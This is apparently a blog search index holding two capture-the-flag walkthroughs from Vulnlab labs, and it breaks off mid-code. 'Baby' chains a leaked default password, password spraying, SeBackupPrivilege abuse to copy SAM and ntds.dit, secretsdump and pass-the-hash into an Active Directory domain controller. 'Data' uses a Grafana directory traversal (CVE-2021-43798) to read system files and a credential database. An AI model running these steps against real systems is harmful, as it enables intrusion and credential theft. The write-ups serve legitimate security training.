<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Vulnlab-Baby</title>
    <url>/2025/01/21/Vulnlab-Baby/</url>
    <content><![CDATA[<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Start enumeration with nmap scan.</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.94SVN scan initiated Mon Jan 20 20:59:07 2025 as: /usr/lib/nmap/nmap --privileged -sV -o nmap 10.10.106.191</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.106.191</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 991 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-01-20 13:00:08Z)</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5357/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Mon Jan 20 21:00:23 2025 -- 1 IP address (1 host up) scanned in 76.33 seconds</span></span><br></pre></td></tr></table></figure></div>

<p>Further enumeration with <code>ldapsearch</code></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>#29-39</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">#ldapsearch1-enumUsers</span></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/vulnlab/easy/Baby~10.10.106.191]</span><br><span class="line">└─$ ldapsearch -x -b <span class="string">&quot;dc=baby,dc=vl&quot;</span> <span class="string">&quot;user&quot;</span>  -H ldap://10.10.106.191 | grep dn</span><br><span class="line">dn: DC=baby,DC=vl</span><br><span class="line">dn: CN=Administrator,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Guest,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=krbtgt,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Domain Users,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Protected Users,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Key Admins,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=dev,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Hugh George,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl</span><br><span class="line">dn: CN=it,CN=Users,DC=baby,DC=vl</span><br><span class="line">dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br><span class="line">dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ldapsearch2-discoverPasswd</span></span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/vulnlab/easy/Baby~10.10.106.191]</span><br><span class="line">└─$ ldapsearch -x -b <span class="string">&quot;dc=baby,dc=vl&quot;</span> <span class="string">&quot;*&quot;</span>  -H ldap://10.10.106.191 | grep desc -A2</span><br><span class="line">... more above ...</span><br><span class="line">--</span><br><span class="line">description: Set initial password to BabyStart123!</span><br><span class="line">givenName: Teresa</span><br><span class="line">distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span><br></pre></td></tr></table></figure></div>
<h3 id="Figuring-out-the-User"><a href="#Figuring-out-the-User" class="headerlink" title="Figuring out the User"></a>Figuring out the User</h3><p>Using the default password, try to access SMB file shares</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/vulnlab/easy/Baby~10.10.106.191]</span><br><span class="line">└─$ crackmapexec smb 10.10.106.191 -u potential-users -p <span class="string">&#x27;BabyStart123!&#x27;</span> --shares</span><br><span class="line">SMB         10.10.106.191   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)</span><br><span class="line">                                ... fail login attempts ...</span><br><span class="line">SMB         10.10.106.191   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE</span><br></pre></td></tr></table></figure></div>
<p><em>potential-users</em> is extracted from <em>ldapsearch1-enumUsers</em></p>
<br>

<p>With that, we can change the password of user (caroline.robinson) using smbpasswd and login into evil-winrm</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/vulnlab/easy/Baby~10.10.106.191]</span><br><span class="line">└─$ smbpasswd -U caroline.robinson -r 10.10.106.191</span><br><span class="line">Old SMB password:</span><br><span class="line">New SMB password:</span><br><span class="line">Retype new SMB password:   <span class="comment">#newPassword@2025</span></span><br><span class="line">Password changed <span class="keyword">for</span> user caroline.robinson </span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/vulnlab/easy/Baby~10.10.106.191]</span><br><span class="line">└─$ evil-winrm -i 10.10.106.191 -u caroline.robinson</span><br><span class="line">Enter Password:</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; <span class="built_in">cd</span> ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Caroline.Robinson\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website</span><br><span class="line">-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website</span><br><span class="line">-a----        11/21/2021   3:24 PM             36 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; <span class="built_in">cat</span> user.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>


<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="SeBackupPrivilege-SeRestorePrivilege"><a href="#SeBackupPrivilege-SeRestorePrivilege" class="headerlink" title="SeBackupPrivilege &amp; SeRestorePrivilege"></a>SeBackupPrivilege &amp; SeRestorePrivilege</h3><p>Run <code>whoami /all</code> or <code>whoami /priv</code>to check enabled privileges</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop&gt; <span class="built_in">whoami</span> /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name              SID</span><br><span class="line">====================== ==============================================</span><br><span class="line">baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ==================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\High Mandatory Level       Label            S-1-16-12288</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Enabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Enabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span> Enabled</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER CLAIMS INFORMATION</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support <span class="keyword">for</span> Dynamic Access Control on this device has been disabled.</span><br></pre></td></tr></table></figure></div>

<p>notice that <code>SeBackupPrivilege</code> &amp; <code>SeRestorePrivilege</code> is enabled [<a class="link"   href="https://medium.com/@irfanbhat3/windows-privilege-escalation-through-sebackup-serestore-dd00604ce6b5]" >https://medium.com/@irfanbhat3/windows-privilege-escalation-through-sebackup-serestore-dd00604ce6b5]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>with that</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson&gt; <span class="built_in">mkdir</span> tempo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Caroline.Robinson</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">d-----         1/20/2025   1:30 PM                tempo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson&gt; <span class="built_in">cd</span> tempo</span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\tempo&gt; reg save hklm\system C:\Users\Caroline.Robinson\tempo\system.hive</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\tempo&gt; reg save hklm\sam C:\Users\Caroline.Robinson\tempo\sam.hive</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\tempo&gt; download sam.hive</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\Users\Caroline.Robinson\tempo\sam.hive to sam.hive</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br><span class="line">*Evil-WinRM* PS C:\Users\Caroline.Robinson\tempo&gt; download system.hive</span><br><span class="line"></span><br><span class="line">Info: Downloading C:\Users\Caroline.Robinson\tempo\system.hive to system.hive</span><br><span class="line"></span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure></div>

<h3 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit"></a>NTDS.dit</h3><p>Getting the NTDS.dit as well to recover domain admin’s hash instead of using <code>pypkatz</code> and cracking sam + system to recover local administrator hash. Referring this script [<a class="link"   href="https://vuln.dev/lab-baby-walkthrough]" >https://vuln.dev/lab-baby-walkthrough]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># save this in script.txt</span><br><span class="line">set metadata C:\Windows\Temp\meta.cabX</span><br><span class="line">set context clientaccessibleX</span><br><span class="line">set context persistentX</span><br><span class="line">begin backupX</span><br><span class="line">add volume C: alias cdriveX</span><br><span class="line">createX</span><br><span class="line">expose %cdrive% E:X</span><br><span class="line">end backupX</span><br><span class="line"></span><br><span class="line"># run diskshadow</span><br><span class="line">diskshadow /s script.txt</span><br><span class="line"></span><br><span class="line"># copy ntds to c</span><br><span class="line">robocopy /b E:\Windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure></div>

<h3 id="Impacket-secretsdump"><a href="#Impacket-secretsdump" class="headerlink" title="Impacket-secretsdump"></a>Impacket-secretsdump</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/vulnlab/easy/Baby~10.10.106.191]</span><br><span class="line">└─$ impacket-secretsdump -sam sam.hive -system system.hive -ntds ntds.dit LOCAL</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Searching for pekList, be patient</span></span><br><span class="line"><span class="string">[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6</span></span><br><span class="line"><span class="string">[*] Reading and decrypting hashes from ntds.dit</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::</span></span><br><span class="line"><span class="string">... more to go ...</span></span><br><span class="line"><span class="string">[*] Cleaning up...</span></span><br></pre></td></tr></table></figure></div>

<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>After that, using the hash, log into administrator using evil-winrm</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/vulnlab/easy/Baby~10.10.106.191]</span><br><span class="line">└─$ evil-winrm -i 10.10.106.191 -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cat</span> ../Desktop/root.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-baby/baby-pwn.png"
                      alt="pwn"
                ></p>
]]></content>
      <tags>
        <tag>Vulnlab</tag>
        <tag>Easy</tag>
        <tag>Windows</tag>
        <tag>Active Directory</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnlab-Data</title>
    <url>/2025/01/28/Vulnlab-Data/</url>
    <content><![CDATA[<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Nmap scanning</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 14:46 +08</span><br><span class="line">Nmap scan report for 10.10.102.141</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">... unrecognized service goes here ...</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 105.79 seconds</span><br></pre></td></tr></table></figure></div>
<p>notice that port 22 and 3000 is open</p>
<h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><p>Try to see what is hosting over port 3000</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141$ curl http://<span class="variable">$ip</span>:3000</span><br><span class="line">&lt;a href=<span class="string">&quot;/login&quot;</span>&gt;Found&lt;/a&gt;.</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-data/grafana-web.png"
                      alt="grafana-web"
                ></p>
<p>Going through the source code of the website, seems like there’s no hardcoded credentials to be used</p>
<br>

<p>Try to fuzz the website on port 3000 for more content, but seems like there’s nothing also</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141$ ffuf -u http://<span class="variable">$ip</span>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.10.102.141/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [20478/20478] :: Job [1/1] :: 112 req/sec :: Duration: [0:03:21] :: Errors: 20478 ::</span></span><br></pre></td></tr></table></figure></div>

<p>Google for <code>Grafana v8.0.0</code> and found out that there’s a CVE known as <code>CVE-2021-43798</code>, which is vulnerable to directory traversal via <code>&lt;grafana_host_url/public/plugins/&lt;plugins_name&gt;/..</code></p>
<br>

<p>Therefore, try to see if the vulnerability is valid to be used in the port 3000<br>Using the default plugin list in Grafana from [<a class="link"   href="https://github.com/jas502n/Grafana-CVE-2021-43798]" >https://github.com/jas502n/Grafana-CVE-2021-43798]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~$ curl --path-as-is http://<span class="variable">$ip</span>:3000/public/plugins/&lt;plugins_name&gt;/../../../../../../../../etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">... more to go ...</span><br><span class="line">grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>using <code>curl</code> + <code>--path-as-is</code> allows the <code>../</code> to be recognized instead in browser which automatically removes the <code>../</code> in the path</p>
</blockquote>
<br>

<p>Also using the list from jas520n’s github, discovers few more files that can be read via directory traversal which are:</p>
<ol>
<li><code>/etc/grafana/grafana.ini</code></li>
<li><code>/var/lib/grafana/grafana.db</code> (something interesting might be in database as always)<br><code>/proc/net/fib_trie</code> &amp; <code>/proc/net/tcp</code> returns some interesting error line: <code>seeker cant&#39;t seek</code></li>
</ol>
<p>Try to download the grafana.db via directory traversal</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Data~10.10.102.141$ curl --path-as-is http://<span class="variable">$ip</span>:3000/public/plugins/zipkin/../../../../../../../../../../var/lib/grafana/grafana.db --output grafana.db</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  584k  100  584k    0     0   415k      0  0:00:01  0:00:01 --:--:--  415k</span><br></pre></td></tr></table></figure></div>
<p>Check the .db for potential credentials and found this</p>
<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">... more above ...</span><br><span class="line">sqlite<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="number">1</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span>admin<span class="operator">|</span>admin<span class="variable">@localhost</span><span class="operator">||</span><span class="number">7</span>a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8<span class="operator">|</span>YObSoLj55S<span class="operator">|</span>hLLY6QQ4Y6<span class="operator">||</span><span class="number">1</span><span class="operator">|</span><span class="number">1</span><span class="operator">|</span><span class="number">0</span><span class="operator">||</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">48</span>:<span class="number">04</span><span class="operator">|</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">48</span>:<span class="number">50</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">48</span>:<span class="number">50</span><span class="operator">|</span><span class="number">0</span></span><br><span class="line"><span class="number">2</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span>boris<span class="operator">|</span>boris<span class="variable">@data</span>.vl<span class="operator">|</span>boris<span class="operator">|</span>dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8<span class="operator">|</span>LCBhdtJWjl<span class="operator">|</span>mYl941ma8w<span class="operator">||</span><span class="number">1</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span><span class="number">0</span><span class="operator">||</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">49</span>:<span class="number">11</span><span class="operator">|</span><span class="number">2022</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">49</span>:<span class="number">11</span><span class="operator">|</span><span class="number">0</span><span class="operator">|</span><span class="number">2012</span><span class="number">-01</span><span class="number">-23</span> <span class="number">12</span>:<span class="number">49</span>:<span class="number">11</span><span class="operator">|</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
<h3 id="Crack-the-Hash"><a href="#Crack-the-Hash" class="headerlink" title="Crack the Hash"></a>Crack the Hash</h3><p>Via vulncheck’s blog [<a class="link"   href="https://vulncheck.com/blog/grafana-cve-2021-43798]" >https://vulncheck.com/blog/grafana-cve-2021-43798]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, generate the script to retrieve the password</p>
<div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">        <span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">        <span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">        <span class="string">&quot;fmt&quot;</span></span><br><span class="line">        <span class="string">&quot;log&quot;</span></span><br><span class="line">        <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;golang.org/x/crypto/pbkdf2&quot;</span></span><br><span class="line">        <span class="string">&quot;database/sql&quot;</span></span><br><span class="line">        _ <span class="string">&quot;github.com/mattn/go-sqlite3&quot;</span> <span class="comment">// Replace with your database driver</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// EncryptionKeyToBytes generates a key using PBKDF2.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncryptionKeyToBytes</span><span class="params">(secret, salt <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">        <span 